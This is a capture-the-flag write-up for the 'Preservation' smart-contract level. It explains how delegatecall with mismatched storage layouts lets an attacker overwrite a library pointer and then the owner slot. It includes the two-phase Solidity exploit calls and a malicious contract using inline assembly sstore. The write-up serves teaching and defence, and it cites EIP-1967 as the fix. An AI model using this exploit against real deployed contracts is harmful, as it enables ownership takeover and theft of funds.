# Level 16: Preservation

**Target:** [Preservation.sol](./Preservation.sol)

## Vulnerability

Storage slot collision via `delegatecall`. The `Preservation` contract delegates execution to `LibraryContract`, but their storage layouts are misaligned — `LibraryContract.setTime()` writes to its own slot 0 (`storedTime`), which in the context of the calling contract overwrites slot 0 (`timeZone1Library`), not the intended `storedTime` at slot 3.

## Storage Layout Mismatch

| Slot | Preservation | LibraryContract |
|------|-------------|-----------------|
| 0 | `timeZone1Library` | `storedTime` ← collision |
| 1 | `timeZone2Library` | — |
| 2 | `owner` | — |
| 3 | `storedTime` | — |

## Root Cause

`delegatecall` executes the callee's code in the caller's storage context. It operates on **slot numbers**, not variable names. When the library writes to its slot 0, it actually modifies `timeZone1Library` in the proxy — allowing an attacker to redirect future `delegatecall` targets to a malicious contract.

## Exploit

Two-phase attack executed via a Foundry script:

**Phase 1 — Hijack the library pointer:**
```solidity
// Convert exploit contract address to uint256 and pass as _timeStamp
IExploit(target).setFirstTime(uint256(uint160(exploitAddress)));
// LibraryContract.setTime() writes to slot 0 → overwrites timeZone1Library with exploit address
```

**Phase 2 — Overwrite owner:**
```solidity
// Now setFirstTime delegates to our exploit contract
IExploit(target).setFirstTime(uint256(uint160(msg.sender)));
// Exploit.setTime() uses sstore(2, _newOwner) → overwrites owner (slot 2)
```

The exploit contract mirrors the target's storage layout and uses inline assembly (`sstore(2, _newOwner)`) to write directly to the owner slot:

```solidity
contract Exploit {
    uint256 v;              // slot 0 — padding
    uint256 r;              // slot 1 — padding
    address public owner;   // slot 2 — aligned with Preservation.owner

    function setTime(uint256 _newOwner) public {
        assembly { sstore(2, _newOwner) }
    }
}
```

## Real-World Reference

Storage collision via `delegatecall` is one of the most critical vulnerability classes in upgradeable proxy architectures. The **Audius governance hack (2022, $6M)** exploited a storage layout mismatch between a proxy and its implementation contract. This is precisely why EIP-1967 (Unstructured Storage Proxy) was created — it stores critical proxy variables (admin, implementation address) at pseudo-random slots derived from `keccak256`, making accidental collisions virtually impossible.